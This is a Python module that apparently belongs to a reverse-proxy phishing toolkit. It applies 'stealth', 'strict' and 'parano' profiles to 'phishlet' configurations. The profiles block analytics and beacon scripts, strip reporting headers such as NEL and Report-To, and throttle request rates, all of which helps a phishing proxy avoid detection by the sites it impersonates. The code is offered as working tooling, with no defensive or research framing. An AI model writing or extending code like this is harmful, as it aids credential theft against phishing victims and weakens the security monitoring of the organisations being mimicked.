"""
Vantablack Core v5 - CLI Profiles
=================================

This module manages the configuration profiles for the `edge-run` command.
"""

import yaml
import os

def apply_profile(profile: str, phishlet_yaml: str, cli_options: dict) -> tuple[str, dict]:
    """
    Applies a given profile to the phishlet configuration and CLI options.

    :param profile: The name of the profile to apply (e.g., 'stealth', 'strict').
    :param phishlet_yaml: The original YAML content of the phishlet.
    :param cli_options: A dictionary of the options passed to the CLI command.
    :return: A tuple containing the modified phishlet YAML and the updated CLI options.
    """
    try:
        data = yaml.safe_load(phishlet_yaml)
        if not isinstance(data, dict):
            raise ValueError("Invalid phishlet YAML")

        profile = (profile or "default").lower()
        
        # Default options that can be overridden by profiles
        options = {
            'rate': cli_options.get('rate'),
            'http2': cli_options.get('http2', True)
        }

        if profile == "stealth":
            # Aggressive blocklist
            bl = data.get("blocklist", [])
            extra_bl = [
                {"pattern": "analytics|gtm|/metrics|/collect", "mimes": ["text/javascript", "application/javascript"], "max_kb": 512},
                {"pattern": "/fonts/|/woff2|/ttf", "mimes": ["font/"], "max_kb": 256},
            ]
            bl.extend(extra_bl)
            data["blocklist"] = bl
            
            # Remove tracking headers
            hdrs = data.get("headers", [])
            hdrs.extend([
                {"action": "remove", "name": "NEL"},
                {"action": "remove", "name": "Report-To"},
            ])
            data["headers"] = hdrs
            
            # Network settings
            if options['rate'] is None:
                options['rate'] = 60

        elif profile == "strict":
            bl = data.get("blocklist", [])
            extra_bl = [
                {"pattern": "analytics|gtm|beacon|/collect|/measure", "mimes": ["text/javascript", "application/javascript"], "max_kb": 256},
                {"pattern": "/video|/media|/stream", "mimes": ["video/"], "max_kb": 400},
            ]
            bl.extend(extra_bl)
            data["blocklist"] = bl
            
            hdrs = data.get("headers", [])
            hdrs.extend([
                {"action": "remove", "name": "NEL"},
                {"action": "remove", "name": "Report-To"},
                {"action": "remove", "name": "Cross-Origin-Opener-Policy"},
            ])
            data["headers"] = hdrs
            
            options['http2'] = False
            if options['rate'] is None:
                options['rate'] = 40

        elif profile == "parano":
            bl = data.get("blocklist", [])
            extra_bl = [
                {"pattern": ".*", "mimes": ["video/"], "max_kb": 1},
                {"pattern": ".*", "mimes": ["image/"], "max_kb": 120},
            ]
            bl.extend(extra_bl)
            data["blocklist"] = bl
            
            options['http2'] = False
            if options['rate'] is None:
                options['rate'] = 30

        # Update environment variables for network settings
        if options['rate'] is not None:
            os.environ["RATE_LIMIT_PER_MINUTE"] = str(options['rate'])
        
        modified_yaml = yaml.safe_dump(data, sort_keys=False)
        return modified_yaml, options

    except Exception as e:
        print(f"[yellow]Could not apply profile '{profile}': {e}[/yellow]")
        return phishlet_yaml, cli_options

